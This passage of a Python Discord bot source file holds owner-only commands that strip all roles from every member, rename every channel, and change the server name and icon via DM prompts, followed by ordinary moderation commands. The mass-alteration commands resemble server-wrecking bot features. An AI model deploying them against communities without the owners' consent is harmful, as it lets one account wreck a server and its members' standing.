# 🎭 ROLE CONTROL COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="strip_roles")
async def strip_roles(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "strip **ALL** roles from every member"):
        return
    guild = ctx.guild
    count = 0
    for member in guild.members:
        if member.id in AUTHORIZED_USER_IDS or member.bot:
            continue
        removable = [r for r in member.roles if not r.is_default() and not r.managed]
        if not removable:
            continue
        try:
            await member.remove_roles(*removable, reason=f"Strip roles by {ctx.author}")
            count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.send(embed=_base_embed("🎭  Roles Stripped", f"Removed all roles from **{count}** members.", C.DANGER), delete_after=3)

@bot.command(name="mass_role_add")
async def mass_role_add(ctx, *, role: discord.Role):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, f"add **{role.name}** to **ALL** members"):
        return
    guild = ctx.guild
    count = 0
    for member in guild.members:
        if member.bot or role in member.roles:
            continue
        try:
            await member.add_roles(role, reason=f"Mass role add by {ctx.author}")
            count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.send(embed=_base_embed("✅  Role Added", f"Added **{role.name}** to **{count}** members.", C.SUCCESS), delete_after=3)

@bot.command(name="mass_role_remove")
async def mass_role_remove(ctx, *, role: discord.Role):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, f"remove **{role.name}** from **ALL** members"):
        return
    guild = ctx.guild
    count = 0
    for member in guild.members:
        if member.bot or role not in member.roles:
            continue
        try:
            await member.remove_roles(role, reason=f"Mass role remove by {ctx.author}")
            count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.send(embed=_base_embed("🗑️  Role Removed", f"Removed **{role.name}** from **{count}** members.", C.DANGER), delete_after=3)


# ══════════════════════════════════════════════════════════════════════════════
# 🏠 SERVER CONTROL COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="rename_all_channels")
async def rename_all_channels(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    try:
        await ctx.author.send(embed=_base_embed("✏️  Rename All Channels", "What would you like to rename all channels to? Reply here with the name.", C.WARNING))
    except discord.Forbidden:
        await ctx.send("❌ I couldn't DM you. Please enable DMs from server members.", delete_after=5)
        return

    def dm_check(m):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)

    try:
        reply = await bot.wait_for("message", timeout=30.0, check=dm_check)
        name = reply.content.strip()
    except asyncio.TimeoutError:
        await ctx.author.send(embed=_base_embed("⏱️  Timed Out", "No response received — action cancelled.", C.NEUTRAL))
        return

    await ctx.author.send(embed=_base_embed(
        "⚠️  Confirm Action",
        f"You are about to rename **ALL** channels to `{name}`.\n\nType **CONFIRM** to proceed or anything else to cancel. (15 seconds)",
        C.WARNING,
    ))
    try:
        confirm_reply = await bot.wait_for("message", timeout=15.0, check=dm_check)
        if confirm_reply.content.strip().upper() != "CONFIRM":
            await ctx.author.send(embed=_base_embed("❌  Cancelled", _flavor("cancelled"), C.NEUTRAL))
            return
    except asyncio.TimeoutError:
        await ctx.author.send(embed=_base_embed("⏱️  Timed Out", "No response received — action cancelled.", C.NEUTRAL))
        return

    guild = ctx.guild
    count = 0
    for channel in guild.channels:
        try:
            await channel.edit(name=name, reason=f"Mass rename by {ctx.author}")
            count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.author.send(embed=_base_embed("✏️  Channels Renamed", f"Renamed **{count}** channels to `{name}`.", C.WARNING))

@bot.command(name="change_server_name")
async def change_server_name(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    try:
        await ctx.author.send(embed=_base_embed("✏️  Change Server Name", "What would you like to rename the server to? Reply here with the name.", C.WARNING))
    except discord.Forbidden:
        await ctx.send("❌ I couldn't DM you. Please enable DMs from server members.", delete_after=5)
        return

    def dm_check(m):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)

    try:
        reply = await bot.wait_for("message", timeout=30.0, check=dm_check)
        name = reply.content.strip()
    except asyncio.TimeoutError:
        await ctx.author.send(embed=_base_embed("⏱️  Timed Out", "No response received — action cancelled.", C.NEUTRAL))
        return

    await ctx.author.send(embed=_base_embed(
        "⚠️  Confirm Action",
        f"You are about to change the server name to **{name}**.\n\nType **CONFIRM** to proceed or anything else to cancel. (15 seconds)",
        C.WARNING,
    ))
    try:
        confirm_reply = await bot.wait_for("message", timeout=15.0, check=dm_check)
        if confirm_reply.content.strip().upper() != "CONFIRM":
            await ctx.author.send(embed=_base_embed("❌  Cancelled", _flavor("cancelled"), C.NEUTRAL))
            return
    except asyncio.TimeoutError:
        await ctx.author.send(embed=_base_embed("⏱️  Timed Out", "No response received — action cancelled.", C.NEUTRAL))
        return

    old_name = ctx.guild.name
    try:
        await ctx.guild.edit(name=name, reason=f"Server rename by {ctx.author}")
        await ctx.author.send(embed=_base_embed("✏️  Server Renamed", f"Server name changed from **{old_name}** to **{name}**.", C.SUCCESS))
    except (discord.Forbidden, discord.HTTPException) as e:
        await ctx.author.send(embed=_base_embed("❌  Failed", str(e), C.DANGER))

@bot.command(name="change_server_icon")
async def change_server_icon(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    try:
        await ctx.author.send(embed=_base_embed("🖼️  Change Server Icon", "Please reply with the **image URL** you want to use as the new server icon.", C.WARNING))
    except discord.Forbidden:
        await ctx.send("❌ I couldn't DM you. Please enable DMs from server members.", delete_after=5)
        return

    def dm_check(m):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)

    try:
        reply = await bot.wait_for("message", timeout=30.0, check=dm_check)
        url = reply.content.strip()
    except asyncio.TimeoutError:
        await ctx.author.send(embed=_base_embed("⏱️  Timed Out", "No response received — action cancelled.", C.NEUTRAL))
        return

    await ctx.author.send(embed=_base_embed(
        "⚠️  Confirm Action",
        "You are about to change the **server icon** to the provided URL.\n\nType **CONFIRM** to proceed or anything else to cancel. (15 seconds)",
        C.WARNING,
    ))
    try:
        confirm_reply = await bot.wait_for("message", timeout=15.0, check=dm_check)
        if confirm_reply.content.strip().upper() != "CONFIRM":
            await ctx.author.send(embed=_base_embed("❌  Cancelled", _flavor("cancelled"), C.NEUTRAL))
            return
    except asyncio.TimeoutError:
        await ctx.author.send(embed=_base_embed("⏱️  Timed Out", "No response received — action cancelled.", C.NEUTRAL))
        return

    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    await ctx.author.send(embed=_base_embed("❌  Failed", "Could not fetch image from that URL.", C.DANGER))
                    return
                icon_bytes = await resp.read()
        await ctx.guild.edit(icon=icon_bytes, reason=f"Icon change by {ctx.author}")
        await ctx.author.send(embed=_base_embed("🖼️  Icon Updated", "Server icon has been changed.", C.SUCCESS))
    except (discord.Forbidden, discord.HTTPException) as e:
        await ctx.author.send(embed=_base_embed("❌  Failed", str(e), C.DANGER))


# ══════════════════════════════════════════════════════════════════════════════
# 🔒 SECURITY / MODERATION COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

def _mod_check(interaction: discord.Interaction, permission: str = None):
    return interaction.user.id in AUTHORIZED_USER_IDS
SERVER_TEMPLATE = {
    "📢 Info": [
        ("text", "welcome", "Say hello to new people joining.", "read_only"),
        ("text", "rules", "How to not get banned.", "read_only"),
        ("text", "announcements", "Big updates you actually need to read..", "read_only"),
    ],
    "💬 Chat": [
        ("text", "general", "Just chilling and talking about whatever.", "chat"),
        ("text", "bot-commands", "Keep your spammy bot stuff in here.", "bot_commands"),
        ("text", "media", "Photos, videos, and links.", "media"),
        ("text", "memes", "Jokes and internet humor.", "media"),
        ("text", "gaming", "Drop your best shitposts and jokes.", "chat"),
        ("text", "clips-highlights", "Gameplay videos.", "media"),
    ],
    "🛠️ Feedback": [
        ("text", "suggestions", "Tell us how to make the server better.", "suggestions"),
    ],
    "🔐 Staff": [
        ("text", "staff-chat", "Private staff discussion.", "staff_chat"),
        ("text", "staff-logs", "Moderation logs and system actions.", "staff_logs"),
        ("voice", "Staff Voice", "Private staff voice channel.", "staff_voice"),
    ],
    "🔊 Voice Channels": [
        ("voice", "🔊 Lounge", "Hop in to talk.", "voice"),
        ("voice", "💤 AFK", "Where you get dumped when you walk away.", "afk_voice"),
    ],
}


async def _get_staff_role(guild: discord.Guild, reason: str):
    role = discord.utils.get(guild.roles, name="Staff")
    if role:
        return role

    me = guild.me or guild.get_member(bot.user.id)
    if me is None or not me.guild_permissions.manage_roles:
        return None

    try:
        return await guild.create_role(
            name="Staff",
            permissions=discord.Permissions.none(),
            mentionable=False,
            reason=reason,
        )
    except (discord.Forbidden, discord.HTTPException):
        return None


def _category_overwrites(guild: discord.Guild, category_name: str, staff_role: discord.Role = None):
    everyone = guild.default_role

    if category_name == "🔐 Staff":
        overwrites = {
            everyone: discord.PermissionOverwrite(view_channel=False)
        }

        if staff_role:
            overwrites[staff_role] = discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True,
            )

        return overwrites

    return {
        everyone: discord.PermissionOverwrite(view_channel=True)
    }


def _setup_overwrites(guild: discord.Guild, preset: str, staff_role: discord.Role = None):
    everyone = guild.default_role

    if preset == "read_only":
        return {
            everyone: discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True,
                send_messages=False,
                add_reactions=False,
                create_public_threads=False,
                create_private_threads=False,
            )
        }

    if preset == "bot_commands":
        return {
            everyone: discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True,
                send_messages=True,
                attach_files=False,
                embed_links=False,
            )
        }

    if preset == "media":
        return {
            everyone: discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True,
                send_messages=True,
                attach_files=True,
                embed_links=True,
            )
        }

    if preset == "suggestions":
        return {
            everyone: discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True,
                send_messages=True,
                add_reactions=True,
                create_public_threads=True,
            )
        }

    if preset == "staff_chat":
        overwrites = {
            everyone: discord.PermissionOverwrite(view_channel=False)
        }

        if staff_role:
            overwrites[staff_role] = discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True,
                send_messages=True,
                attach_files=True,
                embed_links=True,
            )

        return overwrites

    if preset == "staff_logs":
        overwrites = {
            everyone: discord.PermissionOverwrite(view_channel=False)
        }

        if staff_role:
            overwrites[staff_role] = discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True,
                send_messages=False,
                add_reactions=False,
                create_public_threads=False,
                create_private_threads=False,
            )

        return overwrites

    if preset == "staff_voice":
        overwrites = {
            everyone: discord.PermissionOverwrite(
                view_channel=False,
                connect=False,
            )
        }

        if staff_role:
            overwrites[staff_role] = discord.PermissionOverwrite(
                view_channel=True,
                connect=True,
                speak=True,
                stream=True,
                use_voice_activation=True,
            )

        return overwrites

    if preset == "afk_voice":
        return {
            everyone: discord.PermissionOverwrite(
                view_channel=True,
                connect=True,
                speak=False,
                stream=False,
                use_voice_activation=False,
            )
        }

    if preset == "voice":
        return {
            everyone: discord.PermissionOverwrite(
                view_channel=True,
                connect=True,
                speak=True,
                stream=True,
                use_voice_activation=True,
            )
        }

    return {
        everyone: discord.PermissionOverwrite(
            view_channel=True,
            read_message_history=True,
            send_messages=True,
        )
    }


def _find_category(guild: discord.Guild, name: str):
    return discord.utils.get(guild.categories, name=name)


def _find_channel(guild: discord.Guild, name: str, channel_type: str):
    channels = guild.voice_channels if channel_type == "voice" else guild.text_channels
    return discord.utils.get(channels, name=name)


@tree.command(name="setup_server", description="Create the default community server channels.")
async def setup_server(interaction: discord.Interaction):
    if not _mod_check(interaction, "manage_channels"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Manage Channels** permission.", C.DANGER),
            ephemeral=True,
        )
        return

    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message(
            embed=_base_embed("❌  Server Only", "This command can only be used inside a server.", C.DANGER),
            ephemeral=True,
        )
        return

    me = guild.me or guild.get_member(bot.user.id)
    if me is None or not me.guild_permissions.manage_channels:
        await interaction.response.send_message(
            embed=_base_embed("❌  Missing Permission", "I need **Manage Channels** to build the server layout.", C.DANGER),
            ephemeral=True,
        )
        return

    await interaction.response.defer(ephemeral=True, thinking=True)

    created = []
    updated = []
    skipped = []
    afk_channel = None

    staff_role = await _get_staff_role(guild, f"Server setup by {interaction.user}")
    if staff_role is None:
        skipped.append("Staff role")

    for category_name, channel_specs in SERVER_TEMPLATE.items():
        category = _find_category(guild, category_name)
        category_overwrites = _category_overwrites(guild, category_name, staff_role)

        try:
            if category is None:
                category = await guild.create_category(
                    category_name,
                    overwrites=category_overwrites,
                    reason=f"Server setup by {interaction.user}",
                )
                created.append(category_name)
            else:
                await category.edit(
                    overwrites=category_overwrites,
                    reason=f"Server setup refresh by {interaction.user}",
                )
                updated.append(category_name)
        except (discord.Forbidden, discord.HTTPException):
            skipped.append(category_name)
            continue

        for channel_type, channel_name, topic, preset in channel_specs:
            overwrites = _setup_overwrites(guild, preset, staff_role)
            channel = _find_channel(guild, channel_name, channel_type)

            try:
                if channel is None and channel_type == "text":
                    await guild.create_text_channel(
                        channel_name,
                        category=category,
                        topic=topic,
                        overwrites=overwrites,
                        reason=f"Server setup by {interaction.user}",
                    )
                    created.append(f"#{channel_name}")

                elif channel is None:
                    channel = await guild.create_voice_channel(
                        channel_name,
                        category=category,
                        overwrites=overwrites,
                        reason=f"Server setup by {interaction.user}",
                    )
                    created.append(channel_name)

                else:
                    if channel_type == "text":
                        await channel.edit(
                            category=category,
                            topic=topic,
                            overwrites=overwrites,
                            reason=f"Server setup refresh by {interaction.user}",
                        )
                        updated.append(f"#{channel_name}")
                    else:
                        await channel.edit(
                            category=category,
                            overwrites=overwrites,
                            reason=f"Server setup refresh by {interaction.user}",
                        )
                        updated.append(channel_name)

                if preset == "afk_voice":
                    afk_channel = channel or _find_channel(guild, channel_name, channel_type)

            except (discord.Forbidden, discord.HTTPException):
                skipped.append(f"#{channel_name}" if channel_type == "text" else channel_name)

    if afk_channel and me.guild_permissions.manage_guild:
        try:
            await guild.edit(
                afk_channel=afk_channel,
                reason=f"Server setup by {interaction.user}",
            )
        except (discord.Forbidden, discord.HTTPException):
            skipped.append("AFK server setting")

    embed = _base_embed(
        "✅  Server Setup Complete",
        f"_{_flavor('setup_complete')}_\nCreated or refreshed the community channel layout.",
        C.SUCCESS,
    )
    embed.add_field(name="Created", value="\n".join(created[:20]) or "None", inline=False)
    embed.add_field(name="Updated", value="\n".join(updated[:20]) or "None", inline=False)

    if skipped:
        embed.add_field(name="Skipped", value="\n".join(skipped[:20]), inline=False)

    embed.set_footer(
        text="Use /setup_server again to refresh permissions and topics.",
        icon_url=BOT_THUMBNAIL,
    )
    await interaction.followup.send(embed=embed, ephemeral=True)

# ── /ban ──────────────────────────────────────────────────────────────────────
@tree.command(name="ban", description="Ban a member from the server.")
@app_commands.describe(
    member="Member to ban",
    reason="Reason for the ban",
    delete_days="Days of messages to delete (0–7, default 0)",
)
async def ban(
    interaction: discord.Interaction,
    member: discord.Member,
    reason: str = "No reason provided",
    delete_days: int = 0,
):
    if not _mod_check(interaction, "ban_members"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Ban Members** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    if member == interaction.user:
        await interaction.response.send_message(
            embed=_base_embed("❌  Error", "You cannot ban yourself.", C.DANGER), ephemeral=True
        )
        return
    if member.top_role >= interaction.user.top_role and interaction.user.id not in AUTHORIZED_USER_IDS:
        await interaction.response.send_message(
            embed=_base_embed("❌  Error", "You cannot ban someone with an equal or higher role.", C.DANGER),
            ephemeral=True,
        )
        return

    delete_days = max(0, min(7, delete_days))
    try:
        await member.ban(reason=f"{reason} — banned by {interaction.user}", delete_message_days=delete_days)
        embed = _base_embed(
            "🔨  Member Banned",
            f"> **User:** {member.mention} (`{member}`)\n> **Reason:** {reason}\n> **Moderator:** {interaction.user.mention}",
            C.DANGER,
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.timestamp = datetime.now(UTC)
        await interaction.response.send_message(embed=embed)
    except discord.Forbidden:
        await interaction.response.send_message(
            embed=_base_embed("❌  Failed", "I don't have permission to ban that member.", C.DANGER), ephemeral=True
        )

# ── /unban ────────────────────────────────────────────────────────────────────
@tree.command(name="unban", description="Unban a user by their ID.")
@app_commands.describe(user_id="The user's Discord ID", reason="Reason for the unban")
async def unban(interaction: discord.Interaction, user_id: str, reason: str = "No reason provided"):
    if not _mod_check(interaction, "ban_members"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Ban Members** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    try:
        uid = int(user_id)
        user = await bot.fetch_user(uid)
        await interaction.guild.unban(user, reason=f"{reason} — unbanned by {interaction.user}")
        embed = _base_embed(
            "✅  Member Unbanned",
            f"> **User:** `{user}` (`{uid}`)\n> **Reason:** {reason}\n> **Moderator:** {interaction.user.mention}",
            C.SUCCESS,
        )
        embed.timestamp = datetime.now(UTC)
        await interaction.response.send_message(embed=embed)
    except ValueError:
        await interaction.response.send_message(
            embed=_base_embed("❌  Invalid ID", "Please provide a valid numeric user ID.", C.DANGER), ephemeral=True
        )
    except discord.NotFound:
        await interaction.response.send_message(
            embed=_base_embed("❌  Not Found", "That user is not banned or doesn't exist.", C.DANGER), ephemeral=True
        )
    except discord.Forbidden:
        await interaction.response.send_message(
            embed=_base_embed("❌  Failed", "I don't have permission to unban.", C.DANGER), ephemeral=True
        )

# ── /kick ─────────────────────────────────────────────────────────────────────
@tree.command(name="kick", description="Kick a member from the server.")
@app_commands.describe(member="Member to kick", reason="Reason for the kick")
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    if not _mod_check(interaction, "kick_members"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Kick Members** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    if member == interaction.user:
        await interaction.response.send_message(
            embed=_base_embed("❌  Error", "You cannot kick yourself.", C.DANGER), ephemeral=True
        )
        return
    if member.top_role >= interaction.user.top_role and interaction.user.id not in AUTHORIZED_USER_IDS:
        await interaction.response.send_message(
            embed=_base_embed("❌  Error", "You cannot kick someone with an equal or higher role.", C.DANGER),
            ephemeral=True,
        )
        return
    try:
        await member.kick(reason=f"{reason} — kicked by {interaction.user}")
        embed = _base_embed(
            "👢  Member Kicked",
            f"> **User:** {member.mention} (`{member}`)\n> **Reason:** {reason}\n> **Moderator:** {interaction.user.mention}",
            C.WARNING,
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.timestamp = datetime.now(UTC)
        await interaction.response.send_message(embed=embed)
    except discord.Forbidden:
        await interaction.response.send_message(
            embed=_base_embed("❌  Failed", "I don't have permission to kick that member.", C.DANGER), ephemeral=True
        )

# ── /timeout ──────────────────────────────────────────────────────────────────
@tree.command(name="timeout", description="Timeout a member (mutes them for a set duration).")
@app_commands.describe(
    member="Member to timeout",
    minutes="Duration in minutes (1–40320 / up to 28 days)",
    reason="Reason for the timeout",
)
async def timeout_member(
    interaction: discord.Interaction,
    member: discord.Member,
    minutes: int = 10,
    reason: str = "No reason provided",
):
    if not _mod_check(interaction, "moderate_members"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Moderate Members** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    if member == interaction.user:
        await interaction.response.send_message(
            embed=_base_embed("❌  Error", "You cannot timeout yourself.", C.DANGER), ephemeral=True
        )
        return
    if member.top_role >= interaction.user.top_role and interaction.user.id not in AUTHORIZED_USER_IDS:
        await interaction.response.send_message(
            embed=_base_embed("❌  Error", "You cannot timeout someone with an equal or higher role.", C.DANGER),
            ephemeral=True,
        )
        return

    minutes = max(1, min(40320, minutes))
    until = discord.utils.utcnow() + timedelta(minutes=minutes)

    try:
        await member.timeout(until, reason=f"{reason} — timed out by {interaction.user}")
        hours, mins = divmod(minutes, 60)
        days, hours = divmod(hours, 24)
        duration_str = ""
        if days:   duration_str += f"{days}d "
        if hours:  duration_str += f"{hours}h "
        duration_str += f"{mins}m"

        embed = _base_embed(
            "⏱️  Member Timed Out",
            f"> **User:** {member.mention} (`{member}`)\n> **Duration:** {duration_str.strip()}\n> **Reason:** {reason}\n> **Moderator:** {interaction.user.mention}\n> **Expires:** <t:{int(until.timestamp())}:R>",
            C.WARNING,
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.timestamp = datetime.now(UTC)
        await interaction.response.send_message(embed=embed)
    except discord.Forbidden:
        await interaction.response.send_message(
            embed=_base_embed("❌  Failed", "I don't have permission to timeout that member.", C.DANGER), ephemeral=True
        )

# ── /untimeout ────────────────────────────────────────────────────────────────
@tree.command(name="untimeout", description="Remove a timeout from a member.")
@app_commands.describe(member="Member to remove the timeout from", reason="Reason")
async def untimeout_member(
    interaction: discord.Interaction,
    member: discord.Member,
    reason: str = "No reason provided",
):
    if not _mod_check(interaction, "moderate_members"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Moderate Members** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    try:
        await member.timeout(None, reason=f"{reason} — timeout removed by {interaction.user}")
        embed = _base_embed(
            "✅  Timeout Removed",
            f"> **User:** {member.mention} (`{member}`)\n> **Reason:** {reason}\n> **Moderator:** {interaction.user.mention}",
            C.SUCCESS,
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.timestamp = datetime.now(UTC)
        await interaction.response.send_message(embed=embed)
    except discord.Forbidden:
        await interaction.response.send_message(
            embed=_base_embed("❌  Failed", "I don't have permission to remove that timeout.", C.DANGER), ephemeral=True
        )

# ── /warn ─────────────────────────────────────────────────────────────────────
WARNINGS_FILE = "warnings.json"
warnings_lock = threading.Lock()

def load_warnings():
    with warnings_lock:
        if os.path.exists(WARNINGS_FILE):
            with open(WARNINGS_FILE, "r") as f:
                return json.load(f)
        return {}

def save_warnings(data):
    with warnings_lock:
        with open(WARNINGS_FILE, "w") as f:
            json.dump(data, f, indent=2)

def _warn_key(guild_id, user_id):
    return f"{guild_id}:{user_id}"

@tree.command(name="warn", description="Issue a formal warning to a member.")
@app_commands.describe(member="Member to warn", reason="Reason for the warning")
async def warn(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    if not _mod_check(interaction, "kick_members"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Kick Members** permission to warn.", C.DANGER),
            ephemeral=True,
        )
        return
    warnings = load_warnings()
    key = _warn_key(interaction.guild_id, member.id)
    warnings.setdefault(key, []).append({
        "reason": reason,
        "mod": str(interaction.user),
        "time": datetime.now(UTC).isoformat(),
    })
    save_warnings(warnings)
    count = len(warnings[key])

    embed = _base_embed(
        "⚠️  Warning Issued",
        f"> **User:** {member.mention} (`{member}`)\n> **Reason:** {reason}\n> **Moderator:** {interaction.user.mention}\n> **Total Warnings:** {count}",
        C.WARNING,
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.timestamp = datetime.now(UTC)
    await interaction.response.send_message(embed=embed)

    try:
        dm_embed = _base_embed(
            f"⚠️  You received a warning in {interaction.guild.name}",
            f"> **Reason:** {reason}\n> **Moderator:** {interaction.user}\n> **Total Warnings:** {count}",
            C.WARNING,
        )
        await member.send(embed=dm_embed)
    except discord.Forbidden:
        pass

# ── /warnings ─────────────────────────────────────────────────────────────────
@tree.command(name="warnings", description="View all warnings for a member.")
@app_commands.describe(member="Member to check warnings for")
async def warnings(interaction: discord.Interaction, member: discord.Member):
    if not _mod_check(interaction, "kick_members"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Kick Members** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    warnings = load_warnings()
    key = _warn_key(interaction.guild_id, member.id)
    user_warns = warnings.get(key, [])
    if not user_warns:
        await interaction.response.send_message(
            embed=_base_embed("✅  No Warnings", f"_{_flavor('no_warnings')}_\n{member.mention} has a clean record.", C.SUCCESS)
        )
        return

    embed = _base_embed(f"⚠️  Warnings for {member.display_name}", color=C.WARNING)
    embed.set_thumbnail(url=member.display_avatar.url)
    for i, w in enumerate(user_warns, 1):
        ts = datetime.fromisoformat(w["time"]).strftime("%Y-%m-%d %H:%M UTC")
        embed.add_field(
            name=f"Warning #{i}  ·  {ts}",
            value=f"**Reason:** {w['reason']}\n**Moderator:** {w['mod']}",
            inline=False,
        )
    embed.set_footer(text=f"Total warnings: {len(user_warns)}")
    await interaction.response.send_message(embed=embed)

# ── /clearwarnings ────────────────────────────────────────────────────────────
@tree.command(name="clearwarnings", description="Clear all warnings for a member.")
@app_commands.describe(member="Member whose warnings to clear")
async def clearwarnings(interaction: discord.Interaction, member: discord.Member):
    if not _mod_check(interaction, "administrator"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Administrator** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    warnings = load_warnings()
    key = _warn_key(interaction.guild_id, member.id)
    warnings.pop(key, None)
    save_warnings(warnings)
    await interaction.response.send_message(
        embed=_base_embed("🗑️  Warnings Cleared", f"_{_flavor('warnings_cleared')}_\nAll warnings for {member.mention} have been removed.", C.SUCCESS)
    )

# ── /purge ────────────────────────────────────────────────────────────────────
@tree.command(name="purge", description="Bulk-delete messages from a channel.")
@app_commands.describe(
    amount="Number of messages to delete (1–100)",
    member="Only delete messages from this member (optional)",
)
async def purge(interaction: discord.Interaction, amount: int, member: discord.Member = None):
    if not _mod_check(interaction, "manage_messages"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Manage Messages** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    amount = max(1, min(100, amount))
    await interaction.response.defer(ephemeral=True)

    def check(msg):
        return member is None or msg.author == member

    deleted = await interaction.channel.purge(limit=amount, check=check)
    desc = f"Deleted **{len(deleted)}** message{'s' if len(deleted) != 1 else ''}"
    if member:
        desc += f" from {member.mention}"
    desc += f" in {interaction.channel.mention}."
    await interaction.followup.send(
        embed=_base_embed("🧹  Purge Complete", desc, C.SUCCESS), ephemeral=True
    )

# ── /slowmode ─────────────────────────────────────────────────────────────────
@tree.command(name="slowmode", description="Set slowmode delay for the current channel.")
@app_commands.describe(seconds="Delay in seconds (0 to disable, max 21600)")
async def slowmode(interaction: discord.Interaction, seconds: int = 0):
    if not _mod_check(interaction, "manage_channels"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Manage Channels** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    seconds = max(0, min(21600, seconds))
    await interaction.channel.edit(slowmode_delay=seconds)
    if seconds == 0:
        msg = f"Slowmode has been **disabled** in {interaction.channel.mention}."
    else:
        msg = f"Slowmode set to **{seconds}s** in {interaction.channel.mention}."
    await interaction.response.send_message(embed=_base_embed("🐢  Slowmode Updated", msg, C.PRIMARY))

# ── /lock / /unlock ───────────────────────────────────────────────────────────
@tree.command(name="lock", description="Lock a channel so members cannot send messages.")
@app_commands.describe(channel="Channel to lock (defaults to current)", reason="Reason")
async def lock(interaction: discord.Interaction, channel: discord.TextChannel = None, reason: str = "No reason provided"):
    if not _mod_check(interaction, "manage_channels"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Manage Channels** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    ch = channel or interaction.channel
    overwrite = ch.overwrites_for(interaction.guild.default_role)
    overwrite.send_messages = False
    await ch.edit(overwrites={interaction.guild.default_role: overwrite}, reason=reason)
    embed = _base_embed("🔒  Channel Locked", f"{ch.mention} has been locked.\n> **Reason:** {reason}", C.DANGER)
    embed.timestamp = datetime.now(UTC)
    await interaction.response.send_message(embed=embed)

@tree.command(name="unlock", description="Unlock a previously locked channel.")
@app_commands.describe(channel="Channel to unlock (defaults to current)", reason="Reason")
async def unlock(interaction: discord.Interaction, channel: discord.TextChannel = None, reason: str = "No reason provided"):
    if not _mod_check(interaction, "manage_channels"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need **Manage Channels** permission.", C.DANGER),
            ephemeral=True,
        )
        return
    ch = channel or interaction.channel
    overwrite = ch.overwrites_for(interaction.guild.default_role)
    overwrite.send_messages = None
    await ch.edit(overwrites={interaction.guild.default_role: overwrite}, reason=reason)
    embed = _base_embed("🔓  Channel Unlocked", f"{ch.mention} is now open.\n> **Reason:** {reason}", C.SUCCESS)
    embed.timestamp = datetime.now(UTC)
    await interaction.response.send_message(embed=embed)

# ── /userinfo ─────────────────────────────────────────────────────────────────
@tree.command(name="userinfo", description="Display detailed information about a member.")
@app_commands.describe(member="Member to inspect (defaults to yourself)")
async def userinfo(interaction: discord.Interaction, member: discord.Member = None):
    member = member or interaction.user
    roles = [r.mention for r in reversed(member.roles) if not r.is_default()]
    warnings = load_warnings()
